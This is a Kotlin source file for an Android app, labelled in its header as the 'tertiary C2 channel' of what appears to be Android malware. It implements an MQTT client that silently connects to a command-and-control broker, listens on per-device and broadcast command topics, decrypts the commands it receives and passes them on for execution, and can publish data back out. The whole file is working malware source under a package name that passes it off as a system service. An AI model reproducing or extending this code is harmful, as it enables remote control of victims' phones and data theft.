// [context: Kotlin, Android API 26+, Eclipse Paho MQTT tertiary C2 channel]
package com.system.service.network

import android.content.Context
import com.system.service.core.C2Command
import com.system.service.crypto.PayloadDecryptor
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import org.json.JSONObject

class MQTTClient(
    private val context: Context,
    private val onCommand: (C2Command) -> Unit
) {
    private var client: MqttClient? = null
    private val deviceId = DeviceIdentifier.getDeviceId(context)

    fun connect(brokerUrl: String) {
        val opts = MqttConnectOptions().apply {
            isAutomaticReconnect = true
            isCleanSession = false
            keepAliveInterval = 60
            connectionTimeout = 30
        }
        client = MqttClient(brokerUrl, deviceId, MemoryPersistence())
        client?.setCallback(object : MqttCallbackExtended {
            override fun connectComplete(reconnect: Boolean, serverURI: String) {
                subscribe()
            }
            override fun connectionLost(cause: Throwable?) {}
            override fun messageArrived(topic: String, message: MqttMessage) {
                handleMessage(message.payload)
            }
            override fun deliveryComplete(token: IMqttDeliveryToken?) {}
        })
        client?.connect(opts)
    }

    private fun subscribe() {
        client?.subscribe("device/$deviceId/cmd", 1)
        client?.subscribe("broadcast/cmd", 1)
    }

    private fun handleMessage(payload: ByteArray) {
        val plain = PayloadDecryptor.decrypt(payload) ?: return
        val json = JSONObject(String(plain))
        val typeCode = json.optInt("type", -1)
        val type = com.system.service.core.CommandType.values()
            .firstOrNull { it.code == typeCode } ?: return
        onCommand(com.system.service.core.C2Command(
            id = json.optString("id"),
            type = type,
            params = emptyMap()
        ))
    }

    fun publish(topic: String, payload: ByteArray) {
        client?.publish(topic, MqttMessage(payload).apply { qos = 1 })
    }

    fun disconnect() = client?.disconnect()
}
